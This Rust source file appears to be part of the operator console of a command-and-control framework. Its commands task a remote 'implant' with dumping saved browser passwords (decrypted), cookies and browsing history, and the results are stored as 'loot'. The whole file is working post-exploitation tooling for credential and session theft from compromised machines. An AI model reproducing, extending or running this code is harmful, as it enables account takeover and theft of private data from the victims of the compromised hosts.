//! Browser credential and data exfiltration commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Dump saved passwords from installed browsers on the implant
pub async fn passwords(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping browser saved passwords...");
    let task = protocol::BrowserTask {
        operation: Some(protocol::browser_task::Operation::Passwords(protocol::BrowserDumpPasswords {
            browsers: vec![],
            decrypt: true,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "browser", task_data).await?;
    print_success(&format!("Browser passwords task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be saved to loot once complete");

    Ok(())
}

/// Dump cookies from installed browsers on the implant
pub async fn cookies(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping browser cookies...");
    let task = protocol::BrowserTask {
        operation: Some(protocol::browser_task::Operation::Cookies(protocol::BrowserDumpCookies {
            browsers: vec![],
            domains: vec![],
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "browser", task_data).await?;
    print_success(&format!("Browser cookies task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Cookies will be saved to loot once complete");

    Ok(())
}

/// Dump browsing history from installed browsers on the implant
pub async fn history(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping browser history...");
    let task = protocol::BrowserTask {
        operation: Some(protocol::browser_task::Operation::History(protocol::BrowserDumpHistory {
            browsers: vec![],
            max_entries: 0,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "browser", task_data).await?;
    print_success(&format!("Browser history task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("History will be saved to loot once complete");

    Ok(())
}

/// Dump all browser data (passwords, cookies, history) from the implant
pub async fn all(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping all browser data (passwords, cookies, history)...");
    let task = protocol::BrowserTask {
        operation: Some(protocol::browser_task::Operation::All(protocol::BrowserDumpAll {
            browsers: vec![],
            decrypt: true,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "browser", task_data).await?;
    print_success(&format!("Browser all task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Data will be saved to loot once complete");

    Ok(())
}
